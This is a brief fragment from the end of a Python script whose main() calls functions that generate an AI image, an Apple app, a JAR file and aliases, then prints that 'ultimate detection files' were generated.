    generate_ai_image()
    generate_apple_app()
    generate_jar()
    create_aliases()
    print("[+] All ultimate detection files successfully generated!")

if __name__ == "__main__":
    main()
